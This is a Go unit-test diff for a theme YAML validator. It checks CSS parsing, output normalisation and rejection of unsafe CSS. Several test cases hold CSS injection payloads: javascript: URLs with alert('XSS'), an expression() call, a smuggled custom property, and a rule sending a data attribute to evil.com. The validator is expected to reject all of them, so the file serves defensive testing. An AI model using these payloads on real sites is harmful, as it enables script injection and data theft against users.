@@ -2502,6 +2502,233 @@ func normalizeJSON(t *testing.T, s string) string {
 	return string(b)
 }
 
+func TestThemeValidation(t *testing.T) {
+	tests := []struct {
+		name        string
+		yaml        string
+		expectError bool
+		errorMsg    string
+		expectedCss string
+	}{
+		{
+			name: "valid legacy colors",
+			yaml: `
+type: theme
+colors:
+  primary: "#ff0000"
+  secondary: "#00ff00"
+`,
+			expectError: false,
+		},
+		{
+			name: "valid CSS",
+			yaml: `
+type: theme
+css: |
+  .my-class {
+    color: red;
+    background: blue;
+  }
+`,
+			expectError: false,
+			expectedCss: `.my-class{color:red;background:blue;}`,
+		},
+		{
+			name: "mixing legacy and CSS should fail",
+			yaml: `
+type: theme
+colors:
+  primary: "#ff0000"
+css: |
+  .my-class { color: red; }
+`,
+			expectError: true,
+			errorMsg:    "cannot use both legacy color properties (primary, secondary) and the new CSS property simultaneously",
+		},
+		{
+			name: "invalid CSS syntax - unbalanced braces",
+			yaml: `
+type: theme
+css: |
+  .my-class {
+    color: red;
+`,
+			expectError: true,
+			errorMsg:    "unbalanced braces",
+		},
+		{
+			name: "invalid CSS syntax - no valid rules",
+			yaml: `
+type: theme
+css: "just some text"
+`,
+			expectError: true,
+			errorMsg: `invalid CSS syntax: unexpected ending in qualified rule on line 1 and column 15
+    1: just some text
+                     ^`,
+		},
+		{
+			name: "unsafe CSS syntax - javascript in css",
+			yaml: `
+type: theme
+css: |
+  .malicious {
+    color: red;
+    background-image: url('javascript:alert("XSS")');
+  }
+`,
+			expectError: true,
+			errorMsg:    `disallowed css value: "url('javascript:alert(\"XSS\")')"`,
+		},
+		{
+			name: "unsafe CSS syntax - expression in css",
+			yaml: `
+type: theme
+css: |
+  .malicious {
+    color: red;
+    background: expression(alert('XSS'));
+  }
+`,
+			expectError: true,
+			errorMsg:    `disallowed css value: "expression("`,
+		},
+		{
+			name: "unsafe CSS syntax - invalid url in css",
+			yaml: `
+type: theme
+css: |
+  .malicious {
+    color: red;
+    background: url('javascript:alert(1)');
+  }
+`,
+			expectError: true,
+			errorMsg:    `disallowed css value: "url('javascript:alert(1)')"`,
+		},
+		{
+			name: "unsafe CSS syntax - custom properties with javascript",
+			yaml: `
+type: theme
+css: |
+  :root {
+    --user-input: 'javascript:alert("XSS")';
+  }
+
+  .element {
+    background-image: var(--user-input);
+  }
+`,
+			expectError: true,
+			errorMsg:    `disallowed css value: " 'javascript:alert(\"XSS\")'"`,
+		},
+		{
+			name: "unsafe CSS syntax - send data to external domain",
+			yaml: `
+type: theme
+css: |
+  .steal::before {
+    content: attr(data-secret);
+    background: url('http://evil.com/steal?data=' + attr(data-secret));
+  }
+`,
+			expectError: true,
+			errorMsg:    `unexpected ending in declaration`,
+		},
+		{
+			name: "empty CSS should fail",
+			yaml: `
+type: theme
+css: ""
+`,
+			expectError: true,
+			errorMsg:    "CSS cannot be empty",
+		},
+		{
+			name: "complex valid css",
+			yaml: `
+type: theme
+css: |
+  @layer utilities {
+    .ui-copy {
+      @apply text-gray-900;
+    }
+
+    /* Comment */
+  	.ui-copy-number {
+  			font-feature-settings:
+  				"case" 0,
+  				"numr",
+  				"salt" 0,
+  				"tnum";
+  	}
+  }
+  
+  @layer base {
+    :root {
+      --background: var(--color-gray-50);
+      --foreground: var(--color-gray-900);
+  
+  		--color-theme-50: var(
+        --color-theme-light-50,
+        var(--color-primary-light-50)
+      );
+    }
+  
+    :root.dark {
+      --background: var(--color-gray-500);
+    }
+  }
+`,
+			expectError: false,
+			expectedCss: `@layer utilities{.ui-copy{@apply text-gray-900;}.ui-copy-number{font-feature-settings:"case" 0,"numr","salt" 0,"tnum";}}@layer base{:root{--background: var(--color-gray-50);--foreground: var(--color-gray-900);--color-theme-50: var(
+      --color-theme-light-50,
+      var(--color-primary-light-50)
+    );}:root.dark{--background: var(--color-gray-500);}}`,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			ctx := context.Background()
+			repo := makeRepo(t, map[string]string{
+				"rill.yaml":        "", // Minimal rill.yaml to avoid "not found" error
+				"themes/test.yaml": tt.yaml,
+			})
+
+			p, err := Parse(ctx, repo, "", "", "duckdb")
+			require.NoError(t, err)
+
+			if tt.expectError {
+				// Filter out the theme validation error from other errors
+				var themeErrors []*runtimev1.ParseError
+				for _, err := range p.Errors {
+					if err.FilePath == "/themes/test.yaml" {
+						themeErrors = append(themeErrors, err)
+					}
+				}
+				require.Len(t, themeErrors, 1)
+				require.Contains(t, themeErrors[0].Message, tt.errorMsg)
+			} else {
+				// Filter out the theme validation error from other errors
+				var themeErrors []*runtimev1.ParseError
+				for _, err := range p.Errors {
+					if err.FilePath == "/themes/test.yaml" {
+						themeErrors = append(themeErrors, err)
+					}
+				}
+				require.Len(t, themeErrors, 0)
+			}
+
+			if tt.expectedCss != "" {
+				res, ok := p.Resources[ResourceName{Kind: ResourceKindTheme, Name: "test"}]
+				require.True(t, ok)
+				require.Equal(t, tt.expectedCss, res.ThemeSpec.Css)
+			}
+		})
+	}
+}
+
 func must[T any](v T, err error) T {
 	if err != nil {
 		panic(err)
